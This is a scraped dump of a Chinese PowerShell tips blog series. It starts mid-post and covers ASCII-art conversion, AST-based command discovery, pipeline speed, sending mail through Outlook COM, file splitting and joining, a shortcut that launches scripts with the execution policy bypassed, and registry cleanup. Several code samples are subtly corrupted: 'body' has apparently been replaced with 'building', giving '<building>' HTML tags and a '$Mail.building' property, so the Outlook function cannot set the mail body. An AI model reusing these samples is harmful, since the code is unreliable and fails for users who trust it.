$image.Height / ($image.Width / $maxwidth) / $ratio # paint image on a bitmap with the desired size $bitmap = new-object Drawing.Bitmap($image,$maxwidth,$maxheight) # use a string builder to store the characters [System.Text.StringBuilder]$sb = &quot;&lt;html&gt;&lt;building style=&amp;#39;font-family:&quot;&quot;Consolas&quot;&quot;&amp;#39;&gt;&quot; # take each pixel line... for ([int]$y=0; $y -lt $bitmap.Height; $y++) { # take each pixel column... $null = $sb.Append(&quot;&lt;nobr&gt;&quot;) for ([int]$x=0; $x -lt $bitmap.Width; $x++) { # examine pixel $color = $bitmap.GetPixel($x,$y) $brightness = $color.GetBrightness() # choose the character that best matches the # pixel brightness [int]$offset = [Math]::Floor($brightness*$c) $ch = $characters[$offset] if (-not $ch) { $ch = $characters[-1] } $col = &quot;#{0:x2}{1:x2}{2:x2}&quot; -f $color.r, $color.g, $color.b if ($ch -eq &amp;#39; &amp;#39;) { $ch = &quot; &quot;} $null = $sb.Append( &quot;&lt;span style=&quot;&quot;color:$col&quot;&quot;; &quot;&quot;white-space: nowrap;&quot;&quot;&gt;$ch&lt;/span&gt;&quot;) } # add a new line $null = $sb.AppendLine(&quot;&lt;/nobr&gt;&lt;br/&gt;&quot;) } # close html document $null = $sb.AppendLine(&quot;&lt;/building&gt;&lt;/html&gt;&quot;) # clean up and return string $image.Dispose() Set-Content -Path $OutputHtmlPath -Value $sb.ToString() -Encoding UTF8} 还有以下是如何将一张图片转换为一个漂亮的 ASCII 艺术，并在浏览器VS显示，甚至在彩色打印机中打印出来： 12345$ImagePath = &quot;C:\\someInputPicture.jpg&quot;$OutPath = &quot;$home\\desktop\\ASCIIArt.htm&quot;Convert-ImageToAsciiArt -ImagePath $ImagePath -OutputHtml $OutPath -MaxWidth 150Invoke-Item -Path $OutPath 可以通过调整 -MaxWidth 来控制细节。如果增加了宽度，那么也必须调整字体大小并增加字符数。对于更小的字符，您可能需要调整这行： 1[System.Text.StringBuilder]$sb = &quot;&lt;html&gt;&lt;building style=&amp;#39;font-family:&quot;&quot;Consolas&quot;&quot;&amp;#39;&gt;&quot; 例如将它改为这行： 1[System.Text.StringBuilder]$sb = &quot;&lt;html&gt;&lt;building style=&amp;#39;font-family:&quot;&quot;Consolas&quot;&quot;;font-size:4px&amp;#39;&gt;&quot;","link":"/2019/03/11/colorful-ascii-art-from-images/"},{"title":"PowerShell 技能连载 - 检查 Cmdlet 可用性和脚本兼容性（第 1 部分）","text":"并不是所有的 PowerShell cmdlet 都随着 PowerShell 发行。许多 cmdlet 是随着第三方模块发布。当安装某些软件时会同时安装这些模块，或者需要使用特定的 Windows 版本。 要查看您的脚本的兼容性，在第一部分中我们先看看如何查找一个脚本实际使用哪些命令。以下是一个帮助函数，能够利用 PowerShell 内部的抽象语法树 (AST) 来检测命令： 123456789101112131415function Get-ContainedCommand{ param ( [Parameter(Mandatory)][string] $Path, [string][ValidateSet('FunctionDefinition','Command')] $ItemType ) $Token = $Err = $null $ast = [Management.Automation.Language.Parser]::ParseFile($Path, [ref] $Token, [ref] $Err) $ast.FindAll({ $args[0].GetType().Name -eq &quot;${ItemType}Ast&quot; }, $true) Get-ContainedCommand 可以解析一个脚本中定义的函数，或是一个脚本中使用的命令。以下是获取某个脚本中所有定义的函数的代码： 123456$Path = &quot;C:\\scriptToPS1File\\WithFunctionDefinitionsInIt.ps1&quot;$functionNames = Get-ContainedCommand $Path -ItemType FunctionDefinition | Select-Object -ExpandProperty Name$functionNames 以下是脚本内部使用的命令列表： 12$commands = Get-ContainedCommand $Path -ItemType Command$commands.Foreach{$_.CommandElements[0].Extent.Text} 要找出使用外部命令的地方，只需要从命令列表中减掉所有内部定义的函数，然后移除重复。以下将获取某个脚本用到的所有外部命令： 123456789101112$Path = &quot;C:\\scriptToPS1File\\WithFunctionDefinitionsInIt.ps1&quot;$functionNames = Get-ContainedCommand $Path -ItemType FunctionDefinition | Select-Object -ExpandProperty Name$commands = Get-ContainedCommand $Path -ItemType Command$externalCommands = $commands | Where-Object { $commandName = $_.CommandElements[0].Extent.Text $commandName -notin $functionNames } | Sort-Object -Property { $_.GetCommandName() } -Unique","link":"/2019/03/12/checking-cmdlet-availability-and-script-compatibility-part-1/"},{"title":"PowerShell 技能连载 - 检查 Cmdlet 可用性和脚本兼容性（第 2 部分）","text":"并不是所有的 PowerShell cmdlet 都随着 PowerShell 发行。许多 cmdlet 是随着第三方模块发布。当安装某些软件时会同时安装这些模块，或者需要使用特定的 Windows 版本。 在前一部分中我们处理了一个脚本并且读出这个脚本所使用的所有外部命令。我们用这个函数合并了找到的所有外部命令： 12345678910111213141516171819202122232425262728293031323334353637function Get-ExternalCommand{ param ( [Parameter(Mandatory)][string] $Path ) function Get-ContainedCommand { param ( [Parameter(Mandatory)][string] $Path, [string][ValidateSet('FunctionDefinition','Command')] $ItemType ) $Token = $Err = $null $ast = [Management.Automation.Language.Parser]::ParseFile($Path, [ref] $Token, [ref] $Err) $ast.FindAll({ $args[0].GetType().Name -eq &quot;${ItemType}Ast&quot; }, $true) }$functionNames = Get-ContainedCommand $Path -ItemType FunctionDefinition | Select-Object -ExpandProperty Name $commands = Get-ContainedCommand $Path -ItemType Command $commands | Where-Object { $commandName = $_.CommandElements[0].Extent.Text $commandName -notin $functionNames } | ForEach-Object { $_.GetCommandName() } | Sort-Object -Unique} 您可以向这个函数传入任何 PowerShell 脚本路径并且得到这个脚本使用的所有外部命令（只需要确保在 $path 中传入了一个脚本的合法路径）： 1234567891011PS C:\\&gt; Get-ExternalCommand -Path $PathConvertFrom-StringDataGet-AclGet-ItemPropertyGet-ServiceGet-WmiObjectNew-Objectout-defaultTest-PathWhere-Objectwrite-host","link":"/2019/03/13/checking-cmdlet-availability-and-script-compatibility-part-2/"},{"title":"PowerShell 技能连载 - 检查 Cmdlet 可用性和脚本兼容性（第 3 部分）","text":"并不是所有的 PowerShell cmdlet 都随着 PowerShell 发行。许多 cmdlet 是随着第三方模块发布。当安装某些软件时会同时安装这些模块，或者需要使用特定的 Windows 版本。 在之前的部分中我们创建了一个函数，它能够获取某个脚本中的所有外部命令。只需要再做一些额外努力，这就可以变成一个有用的兼容性报告：来自某个模块的所有 cmdlet，或者随着 PowerShell 发行的所有以 “Microsoft.PowerShell” 开头的模块。任何其它模块都属于具体的 Windows 版本或第三方扩展。 检查这个函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function Get-ExternalCommand{ param ( [Parameter(Mandatory)][string] $Path ) function Get-ContainedCommand { param ( [Parameter(Mandatory)][string] $Path, [string][ValidateSet('FunctionDefinition','Command')] $ItemType ) $Token = $Err = $null $ast = [Management.Automation.Language.Parser]::ParseFile($Path, [ref] $Token, [ref] $Err) $ast.FindAll({ $args[0].GetType().Name -eq &quot;${ItemType}Ast&quot; }, $true) }$functionNames = Get-ContainedCommand $Path -ItemType FunctionDefinition | Select-Object -ExpandProperty Name $commands = Get-ContainedCommand $Path -ItemType Command $commands | Where-Object { $commandName = $_.CommandElements[0].Extent.Text $commandName -notin $functionNames } | ForEach-Object { $_.GetCommandName() } | Sort-Object -Unique | ForEach-Object { $module = (Get-Command -name $_).Source $builtIn = $module -like 'Microsoft.PowerShell.*'; [PSCustomObject]@{ Command = $_ BuiltIn = $builtIn Module = $module } }} 以下是根据一个 PowerShell 脚本生成的一个示例报告，它列出了所有外部的 cmdlet，以及它们是否是 PowerShell 的一部分或来自外部模块： 1234567891011121314151617PS&gt; Get-ExternalCommand -Path $PathCommand BuiltIn Module------- ------- ------ConvertFrom-StringData True Microsoft.PowerShell.UtilityGet-Acl True Microsoft.PowerShell.SecurityGet-ItemProperty True Microsoft.PowerShell.ManagementGet-Service True Microsoft.PowerShell.ManagementGet-WmiObject True Microsoft.PowerShell.ManagementNew-Object True Microsoft.PowerShell.Utilityout-default True Microsoft.PowerShell.CoreTest-Path True Microsoft.PowerShell.ManagementWhere-Object True Microsoft.PowerShell.Corewrite-host True Microsoft.PowerShell.UtilityPS&gt;","link":"/2019/03/14/checking-cmdlet-availability-and-script-compatibility-part-3/"},{"title":"PowerShell 技能连载 - 对必选参数使用自定义提示","text":"当您在 PowerShell 定义了必选参数，那么当用户没有传入这个参数时将会收到提示。如您所见，当您运行这段代码时，该提示只使用了参数的名字： 1234567891011121314param( [Parameter(Mandatory)] [string] $UserName)&quot;You entered $Username&quot;UserName: tobiYou entered tobi To get more descriptive prompts, you can use more explicit variable names:要获得描述的更具体的提示，您需要使用更明确的变量名： 123456789101112131415param( [Parameter(Mandatory)] [string] ${Please provide a user name})$username = ${Please provide a user name}&quot;You entered $Username&quot;Please provide a user name: tobiYou entered tobi 只需要在一个函数中使用 param() 块就可以将函数转为命令： 1234567891011121314151617181920function New-CorporateUser{ param ( [Parameter(Mandatory)] [string] ${Please provide a user name} ) $username = ${Please provide a user name} &quot;You entered $Username&quot;}PS C:\\&gt; New-CorporateUserCmdlet New-CorporateUser at command pipeline position 1Supply values for the following parameters:Please provide a user name: TobiYou entered Tobi 它的副作用是参数名中含有空格和特殊字符，将使它无法通过命令行指定值，因为参数无法用双引号包起来： 1PS C:\\&gt; New-CorporateUser -Please provide a user name","link":"/2019/03/15/using-custom-prompts-for-mandatory-parameters/"},{"title":"PowerShell 技能连载 - Where-Object: 只是一个带管道的 IF 语句","text":"Where-Object 是一个最常用的 PowerShell 命令，不过新手可能对它不太熟悉。对于熟悉 “SQL” 数据库查询语言的人可以像 SQL 中的 Where 从句一样使用它它是一个客户端的过滤器，能去除不需要的项目。以下这行代码将处理所有服务并只显示当前正在运行的服务： 1Get-Service | Where-Object { $_.Status -eq &quot;Running&quot; } 要更好地理解 Where-Object 如何工作，实际上它只是一个对管道发生作用的 IF 语句。以上代码等同于这个： 1234Get-Service | ForEach-Object { if ($_.Status -eq &amp;#39;Running&amp;#39;) { $_ }} 或者，完全不用代码的传统实现方式： 12345678$services = Get-ServiceForeach ($_ in $services){ if ($_.Status -eq 'Running') { $_ }}","link":"/2019/03/18/where-object-just-a-pipeline-aware-if-clause/"},{"title":"PowerShell 技能连载 - 提升 PowerShell 管道的速度","text":"当 a) 需要处理许多项目时 b) 使用 PowerShell 管道时，PowerShell 脚本可能会变得非常缓慢。今天让我们找出它的原因，以及解决的方法。 要重现这个问题，让我们先创建一个用例，体现 PowerShell 如何明显变慢。我们需要准备许多项目。这里我们用代码生成 Windows 文件夹下所有文件的列表，这需要几秒钟才能生成完。 123# get large data sets$files = Get-ChildItem -Path c:\\windows -File -Recurse -ErrorAction SilentlyContinue$files.Count 我们将这些文件发送到管道，并且只挑出大于 1MB 的文件。在以下栗子中，我们将 $file 的内容全部发到管道，是为了有可复制的数据。实际情况中，当然不应该使用变量，而应该直接将结果输出到管道。 1234Measure-Command { $largeFiles = $files | Where-Object { $_.Length -gt 1MB }}$largeFiles.Count 在我们的测试中，以上代码需要消耗 3-4 秒，并且产生了 3485 个“大”文件。在您的机器上结果可能不同。 Where-Object 实际上只是一个包含了 If 语句的 ForEach-Object 命令，那么让我们试着将 Where-Object 替换成 If： 1234567Measure-Command {$largeFiles = $Files | ForEach-Object { if ($_.Length -gt 1MB) { $_ } }}$largeFiles.Count 结果是一样的，而时间减少到一半。 ForEach-Object 实际上只是一个有 process 块的匿名脚本块，所以接下来请试试这段代码： 12345678910Measure-Command {$largeFiles = $Files | &amp; { process { if ($_.Length -gt 1MB) { $_ } } }}$largeFiles.Count 结果再次相同，但是结果从原来的 4 秒减少到大约 100 毫秒（四十分之一）。 可见，当通过管道传入数据时，PowerShell 对每个传入的对象调用绑定的参数方法，这将显著地增加时间开销。由于 ForEach-Object 和 Where-Object 使用参数，所以会激活绑定。 当您不使用内部包含 process 脚本块的匿名脚本块时，将忽略所有的参数绑定并显著加速 PowerShell 管道的执行速度。","link":"/2019/03/19/speeding-up-the-powershell-pipeline/"},{"title":"PowerShell 技能连载 - 智力游戏生成器","text":"人脑可以阅读每个单词头尾字母正确而其它字母顺序错乱的橘子。以下是一个可以自己实验的 PowerShell 函数。它输入一个句子，并将除了每个单词首末字母之外的字母打乱： 12345678910111213141516171819202122232425262728function Convert-Text{ param ( $Text = 'Early to bed and early to rise makes a man healthy, wealthy and wise.' ) $words = $Text -split ' ' $newWords = foreach($word in $words) { if ($word.Length -le 2) { $word } else { $firstChar = $word[0] $lastChar = $word[-1] $charLen = $word.Length -2 $inbetween = $word[1..$charLen] $chars = $inbetween | Get-Random -Count $word.Length $inbetweenScrambled = $chars -join '' &quot;$firstChar$inbetweenScrambled$lastChar&quot; } } $newWords -join ' '} 如果没有输入文本，那么将采用默认文本。您可以猜出它的意思吗？ 12PS C:\\&gt; Convert-TextEalry to bed and erlay to rsie maeks a man hylhtea, wlhtaey and wies.","link":"/2019/03/20/mind-jogging-generator/"},{"title":"PowerShell 技能连载 - 通过 Outlook 发送邮件","text":"您可以通过 Send-MailMessage 用 PowerShell 发送邮件。然而，这需要一个 SMTP 服务器，并且通过这种方式发送的邮件不会在您的邮箱中存档。 要通过 Outlook 发送邮件，请看这个函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function Send-OutlookMail{param ( # the email address to send to [Parameter(Mandatory=$true, Position=0, HelpMessage='The email address to send the mail to')] [String] $Recipient, # the subject line [Parameter(Mandatory=$true, HelpMessage='The subject line')] [String] $Subject, # the building text [Parameter(Mandatory=$true, HelpMessage='The building text')] [String] $building, # a valid file path to the attachment file (optional) [Parameter(Mandatory=$false)] [System.String] $FilePath = '', # mail importance (0=low, 1=normal, 2=high) [Parameter(Mandatory=$false)] [Int] [ValidateRange(0,2)] $Importance = 1, # when set, the mail is sent immediately. Else, the mail opens in a dialog [Switch] $SendImmediately ) $o = New-Object -ComObject Outlook.Application $Mail = $o.CreateItem(0) $mail.importance = $Importance $Mail.To = $Recipient $Mail.Subject = $Subject $Mail.building = $building if ($FilePath -ne '') { try { $null = $Mail.Attachments.Add($FilePath) } catch { Write-Warning (&quot;Unable to attach $FilePath to mail: &quot; + $_.Exception.Message) return } } if ($SendImmediately -eq $false) { $Mail.Display() } else { $Mail.Send() Start-Sleep -Seconds 10 $o.Quit() Start-Sleep -Seconds 1 $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($o) }} 现在在 Outlook 中很容易： 1PS&gt; Send-OutlookMail -Recipient frank@test.com -Subject 'Hi Frank!' -building 'Trying a new PS script. See attachment.' -FilePath 'c:\\stuff\\sample.zip' -Importance 0 假设您安装了 Outlook 并且设置了用户配置文件，这行代码将在一个对话框窗口中打开写好的邮件，这样您可以再次确认并做最终修改，然后按下“发送”按钮将邮件发送出去。 如果您指定了 -SendImmediately 开关参数，PowerShell 将会试图立即发送邮件。是否能够正确发送取决于您的 Outlook 关于自动操作的安全设置。自动发送邮件可能被禁用，或是会弹出一个对话框来征得您的同意。z","link":"/2019/03/21/sending-mails-via-outlook/"},{"title":"PowerShell 技能连载 - 将大文件拆分成小片段（第 1 部分）","text":"PowerShell 可以将大文件拆分成多个小片段，例如将它们做为电子邮件附件发送。今天，我们关注如何分割文件。在下一个技能中，我们将演示如何将各个部分合并在一起。 要将大文件分割成小片段，我们创建了一个名为 Split-File 的函数。它工作起来类似这样： 1234567PS&gt; Split-File -Path &quot;C:\\Users\\tobwe\\Downloads\\Woman putting gas in Tesla.mp4&quot; -PartSizeBytes 6MB -VerboseVERBOSE: saving to C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.00.part...VERBOSE: saving to C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.01.part...VERBOSE: saving to C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.02.part...VERBOSE: saving to C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.03.part...PS C:\\&gt; -PartSizeByte 参数设置最大的分片尺寸，在我们的例子中是 6MB。当您指定了 -Verbose 参数，该函数将在创建分片文件时显示分片文件名。 要使用 Split-File 函数，您需要运行以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function Split-File{ param ( [Parameter(Mandatory)] [String] $Path, [Int32] $PartSizeBytes = 1MB ) try { # get the path parts to construct the individual part # file names: $fullBaseName = [IO.Path]::GetFileName($Path) $baseName = [IO.Path]::GetFileNameWithoutExtension($Path) $parentFolder = [IO.Path]::GetDirectoryName($Path) $extension = [IO.Path]::GetExtension($Path) # get the original file size and calculate the # number of required parts: $originalFile = New-Object System.IO.FileInfo($Path) $totalChunks = [int]($originalFile.Length / $PartSizeBytes) + 1 $digitCount = [int][Math]::Log10($totalChunks) + 1 # read the original file and split into chunks: $reader = [IO.File]::OpenRead($Path) $count = 0 $buffer = New-Object Byte[] $PartSizeBytes $moreData = $true # read chunks until there is no more data while($moreData) { # read a chunk $bytesRead = $reader.Read($buffer, 0, $buffer.Length) # create the filename for the chunk file $chunkFileName = &quot;$parentFolder\\$fullBaseName.{0:D$digitCount}.part&quot; -f $count Write-Verbose &quot;saving to $chunkFileName...&quot; $output = $buffer # did we read less than the expected bytes? if ($bytesRead -ne $buffer.Length) { # yes, so there is no more data $moreData = $false # shrink the output array to the number of bytes # actually read: $output = New-Object Byte[] $bytesRead [Array]::Copy($buffer, $output, $bytesRead) } # save the read bytes in a new part file [IO.File]::WriteAllBytes($chunkFileName, $output) # increment the part counter ++$count } # done, close reader $reader.Close() } catch { throw &quot;Unable to split file ${Path}: $_&quot; }} 明天我们将研究反向操作：如何将所有分片组合成原始文件。 今日知识点： 用 [IO.Path] 类来分割文件路径。 用 [IO.File] 类在字节级别处理文件内容。 用 Read() 函数将字节写入文件。","link":"/2019/03/22/splitting-large-files-in-smaller-parts-part-1/"},{"title":"PowerShell 技能连载 - 将大文件拆分成小片段（第 2 部分）","text":"在前一个技能中我们介绍了如何讲一个大文件分割成小块。今天，我们将完成一个函数，它能将这些小文件合并成原来的文件。 假设您已经按上一个技能用 Split-File 将一个大文件分割成多个小文件。现在拥有了一大堆扩展名为 “.part” 的文件。这是上一个技能的执行结果： 123456789101112PS&gt; dir &quot;C:\\Users\\tobwe\\Downloads\\*.part&quot; Folder: C:\\Users\\tobwe\\DownloadsMode LastWriteTime Length Name---- ------------- ------ -----a---- 03.03.2019 16:25 6291456 Woman tries putting gas in a Tesla.mp4.00.part-a---- 03.03.2019 16:25 6291456 Woman tries putting gas in a Tesla.mp4.01.part-a---- 03.03.2019 16:25 6291456 Woman tries putting gas in a Tesla.mp4.02.part-a---- 03.03.2019 16:25 5207382 Woman tries putting gas in a Tesla.mp4.03.part 要合并这些部分，请使用我们新的 Join-File 函数（不要和内置的 Join-Path 命令混淆）。让我们先看看它是如何工作的： 12345678PS C:\\&gt; Join-File -Path &quot;C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4&quot; -DeletePartFiles -VerboseVERBOSE: processing C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.00.part...VERBOSE: processing C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.01.part...VERBOSE: processing C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.02.part...VERBOSE: processing C:\\Users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.03.part...VERBOSE: Deleting part files...PS C:\\&gt; 只需要提交文件名（不需要分片编号和分片扩展名）。当您指定了 -DeletePartFiles 参数，函数将会在创建完原始文件之后删除分片文件。 要使用 Join-File 函数，需要先运行这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function Join-File{ param ( [Parameter(Mandatory)] [String] $Path, [Switch] $DeletePartFiles ) try { # get the file parts $files = Get-ChildItem -Path &quot;$Path.*.part&quot; | # sort by part Sort-Object -Property { # get the part number which is the &quot;extension&quot; of the # file name without extension $baseName = [IO.Path]::GetFileNameWithoutExtension($_.Name) $part = [IO.Path]::GetExtension($baseName) if ($part -ne $null -and $part -ne '') { $part = $part.Substring(1) } [int]$part } # append part content to file $writer = [IO.File]::OpenWrite($Path) $files | ForEach-Object { Write-Verbose &quot;processing $_...&quot; $bytes = [IO.File]::ReadAllBytes($_) $writer.Write($bytes, 0, $bytes.Length) } $writer.Close() if ($DeletePartFiles) { Write-Verbose &quot;Deleting part files...&quot; $files | Remove-Item } } catch { throw &quot;Unable to join part files: $_&quot; }} 今日知识点： 使用 [IO.Path] 类来分割文件路径 使用 [IO.file] 类以字节的方式存取文件内容 使用 OpenWrite() 以字节的方式写入文件","link":"/2019/03/25/splitting-large-files-in-smaller-parts-part-2/"},{"title":"PowerShell 技能连载 - 将大文件拆分成小片段（第 3 部分）","text":"在前一个技能中我们延时了如何使用 PowerShell 将文件分割成小的分片，以及如何将这些分片合并起来，重建原始文件。我们甚至进一步扩展了这些函数，将它们发布到 PowerShell Gallery。所以要分割和合并文件，只需要获取该模块并像这样安装： 1PS&gt; Install-Module -Name FileSplitter -Repository PSGallery -Scope CurrentUser -Force 现在当您需要将一个大文件分割成多个小片时，只需要运行以下代码： 1234567PS C:\\&gt; Split-File -Path 'C:\\movies\\Woman tries putting gas in a Tesla.mp4' -PartSizeBytes 10MB -AddSelfExtractor -VerboseVERBOSE: saving to C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.0.part...VERBOSE: saving to C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.1.part...VERBOSE: saving to C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.2.part...VERBOSE: Adding extractor scripts...PS C:\\ Split-Path 将文件分割成不超过 PartSizeByte 参数指定的大小。感谢 -AddSelfExtractor，它还添加了一个可以将分片文件合并为原始文件的脚本，以及一个双击即可执行合并操作的快捷方式。以下是您获得的文件：： 1234567891011121314PS C:\\users\\tobwe\\Downloads&gt; dir *gas* Folder: C:\\moviesMode LastWriteTime Length Name---- ------------- ------ -----a---- 03.03.2019 18:11 2004 Extract Woman tries putting gas in a Tesla.mp4.lnk-a---- 03.03.2019 16:54 24081750 Woman tries putting gas in a Tesla.mp4-a---- 03.03.2019 18:11 10485760 Woman tries putting gas in a Tesla.mp4.0.part-a---- 03.03.2019 18:11 10485760 Woman tries putting gas in a Tesla.mp4.1.part-a---- 03.03.2019 18:11 3110230 Woman tries putting gas in a Tesla.mp4.2.part-a---- 03.03.2019 18:11 3179 Woman tries putting gas in a Tesla.mp4.3.part.ps1 如您所见，有许多包含 .part 扩展名的文件，以及一个扩展名为 .part.ps1 的文件。后者是合并脚本。当您运行这个脚本时，它读取这些分片文件并重建原始文件，然后将删除所有分片文件以及自身。最终，该合并脚本将打开文件管理器并选中恢复的文件。 由于对于普通用户来说可能不了解如何运行 PowerShell 脚本，所以还有一个额外的名为 “Extract…”，扩展名为 .lnk 的文件。这是一个快捷方式文件。当用户双击这个文件，它将运行 PowerShell 合并脚本并恢复原始文件。 如果您希望手工恢复原始文件，您可以手工调用 Join-File： 1234567PS&gt; Join-File -Path 'C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4' -Verbose -DeletePartFilesVERBOSE: processing C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.0.part...VERBOSE: processing C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.1.part...VERBOSE: processing C:\\users\\tobwe\\Downloads\\Woman tries putting gas in a Tesla.mp4.2.part...VERBOSE: Deleting part files...PS&gt;","link":"/2019/03/26/splitting-large-files-in-smaller-parts-part-3/"},{"title":"PowerShell 技能连载 - 修复 PowerShellGet 发布","text":"如果您在使用 Publish-Module 来将您的模块发布到 PowerShell 仓库，并且您一直收到不支持的命令的错误信息，那么可能需要重新安装管理模块上传的可执行程序。当这些可执行程序太旧时，它们可能不能再能和最新的 PowerShellGet 模块同步。 运行这段代码，以管理员权限（对所有用户有效）下载并更新 nuget.exe： 1234567$Path = &quot;$env:ProgramData\\Microsoft\\Windows\\PowerShell\\PowerShellGet&quot;$exists = Test-Path -Path $Pathif (!$exists){ $null = New-Item -Path $Path -ItemType Directory}Invoke-WebRequest -Uri https://aka.ms/psget-nugetexe -OutFile &quot;$Path\\NuGet.exe&quot; 运行这段代码只针对当前用户下载并安装 nuget.exe： 1234567$Path = &quot;$env:LOCALAPPDATA\\Microsoft\\Windows\\PowerShell\\PowerShellGet&quot;$exists = Test-Path -Path $Pathif (!$exists){ $null = New-Item -Path $Path -ItemType Directory}Invoke-WebRequest -Uri https://aka.ms/psget-nugetexe -OutFile &quot;$Path\\NuGet.exe&quot;","link":"/2019/03/27/repairing-powershellget-publishing/"},{"title":"PowerShell 技能连载 - 让新手运行 PowerShell 脚本","text":"假设您要把一段 PowerShell 脚本传给一个没有经验的用户。如何确保对方正确地运行了您的脚本呢？由于操作系统和组策略的限制，有可能并没有一个上下文菜单命令来运行 PowerShell 脚本。这个用户也有可能改变了执行策略设置。 不过有一个非常简单的解决方案：将您的脚本和一个快捷方式一起分发。这个快捷方式包含所有必须的命令行开关，可以通过双击快速执行。您甚至可以为快捷方式分配一个漂亮的图标。然而，您需要一些小技巧来实现。典型的快捷方式使用绝对路径，所以当您将文件发送给客户时这个快捷方式可能无法执行，因为您无法知道客户将把这个文件保存到哪里。诀窍是在快捷方式中使用相对路径。 只需要确保调整了第一行指向希望执行的脚本，然后运行这段代码，就可以了。 12345678910111213141516171819202122232425# specify the path to your PowerShell script$ScriptPath = &quot;C:\\test\\test.ps1&quot;# create a lnk file$shortcutPath = [System.IO.Path]::ChangeExtension($ScriptPath, &quot;lnk&quot;)$filename = [System.IO.Path]::GetFileName($ScriptPath)# create a new shortcut$shell = New-Object -ComObject WScript.Shell$scut = $shell.CreateShortcut($shortcutPath)# launch the script with powershell.exe:$scut.TargetPath = &quot;powershell.exe&quot;# skip profile scripts and enable execution policy for this one call# IMPORTANT: specify only the script file name, not the complete path$scut.Arguments = &quot;-noprofile -executionpolicy bypass -file &quot;&quot;$filename&quot;&quot;&quot;# IMPORTANT: leave the working directory empty. This way, the# shortcut uses relative paths$scut.WorkingDirectory = &quot;&quot;# optinally specify a nice icon$scut.IconLocation = &quot;$env:windir\\system32\\shell32.dll,162&quot;# save shortcut file$scut.Save()# open shortcut file in File Explorerexplorer.exe &quot;/select,$shortcutPath&quot; 这个快捷方式就放在您的 PowerShell 脚本相邻的位置。它使用相对路径，由于我们保证快捷方式和 PowerShell 脚本放在相同的路径，所以它能够完美地工作——这样您可以将两个文件打包，然后将它们发送给客户。当他解压了文件，快捷方式仍然可以工作。您甚至可以将快捷方式改为想要的名字，例如“双击我执行”。 重要：快捷方式使用相对路径来确保这个解决方案便携化。如果您将快捷方式移动到脚本之外的文件夹，那么该快捷方式显然不能工作。。","link":"/2019/03/28/launching-powershell-scripts-for-dummies/"},{"title":"The Largest PowerShell Community in China has 1716 Members Now!","text":"The largest PowerShell community “PowerShell Tech Interact” in China has 1716 members up to March 29, 2019! The goal of this community is to: Help new PowerShellers to get up to PowerShell language Help every PowerSheller overcome any PowerShell technical difficulties Share code and information to accelerate the learning process To contact with the community manager, please visit this MVP link. Join Us Now! (you may need to install QQ client first)","link":"/2019/03/29/largest-powershell-community-in-china-has-1716-members/"},{"title":"PowerShell 技能连载 - 修复 PowerShell 上下文菜单","text":"当您在文件管理器中右键点击一个 PowerShell 脚本文件时，通常会见到一个名为“使用 PowerShell 运行”的上下文菜单项，可以通过它快速地执行 PowerShell 脚本。 然而，在某些系统中，“使用 PowerShell 运行“命令缺失了。原因是当您定义了一个非缺省的“打开方式”命令，那么该命令就会隐藏。要修复它，您只需要删除这个注册表键： 1HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoice 在 regedit.exe 中删除这个键很简单，而且当这个键移除之后，“使用 PowerShell 运行”上下文菜单就再次可见了。 不过实际中在 PowerShell 删除这个注册表键却不太容易。以下这些命令执行都会失败，报告某些子项无法删除： 123456789PS C:\\&gt; Remove-Item HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoicePS C:\\&gt; Remove-Item Registry::HKEY:CURRENT_USER:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoicePS C:\\&gt; Remove-Item 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoice'PS C:\\&gt; Remove-Item HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\'.ps1'\\UserChoicePS C:\\&gt; Remove-Item HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoice -Recurse -Force 我们明天会提供一个解决方案来应对这种情况。","link":"/2019/03/29/repairing-powershell-context-menus/"},{"title":"PowerShell 技能连载 - 删除无法删除的注册表键","text":"删除注册表键通常很简单，用 Remove-Item 就可以了。然而，有时你会遇到一些无法删除的注册表键。在这个技能中我们将演示一个例子，并且提供一个解决方案。 在前一个技能中我们解释了当定义了一个非缺省的打开方式之后，PowerShell 文件的“使用 PowerShell 运行”上下文命令可能会丢失，而且出现了这个注册表键： HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoice 当您在文件管理器中右键点击一个 PowerShell 脚本，然后通过“选择其他应用”，选择一个 ISE 或 VSCode 之外的非缺省应用，并选中“始终使用此应用打开 .ps1 文件”复选框，来使用其他应用来打开 PowerShell 文件，那么注册表中就会创建上述注册表键。 当上述注册表键存在时，上下文菜单中缺省的 PowerShell 命令，例如“使用 PowerShell 运行”将不可见。用注册表删除这个键修复它很容易，但出于某种未知原因用 PowerShell 命令来删除会失败。所有 .NET 的方法也会失败。 以下命令会执行失败： 1Remove-Item -Path 